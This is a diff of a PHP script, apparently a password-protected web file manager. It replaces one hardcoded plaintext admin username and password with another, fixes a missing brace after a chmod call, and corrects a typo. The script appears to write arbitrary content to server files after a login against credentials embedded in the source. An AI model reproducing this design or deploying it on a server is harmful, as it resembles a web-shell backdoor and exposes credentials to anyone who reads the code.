@@ -1,8 +1,8 @@
 <?php
 session_start();
 
-$USERNAME = 'materai';
-$PASSWORD = 'ghost@unb2026';
+$USERNAME = 'adminunb';
+$PASSWORD = 'whois@us456';
 
 if (isset($_POST['login'])) {
     if ($_POST['username'] === $USERNAME && $_POST['password'] === $PASSWORD) {
@@ -247,7 +247,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         
         // Cek apakah file bisa ditulis
         if (!is_writable($filepath) && file_exists($filepath)) {
-            @chmod($filepath, 0644); // Coba ubah permission}
+            @chmod($filepath, 0644); // Coba ubah permission
+        }
         
         $result = file_put_contents($filepath, $content);
         if ($result !== false) {
@@ -431,7 +432,7 @@ foreach ($parts as $part) {
             ?>
             <?php if (!$is_writable): ?>
                 <div class="message error">
-                    ⚠️ File tidak bisaditulis! Permission: <?= $file_perms ?> 
+                    ⚠️ File tidak bisa ditulis! Permission: <?= $file_perms ?> 
                     <br>Untuk memperbaiki, jalankan di terminal: <code>chmod 644 <?= htmlspecialchars($edit_path) ?></code>
                 </div>
             <?php endif; ?>
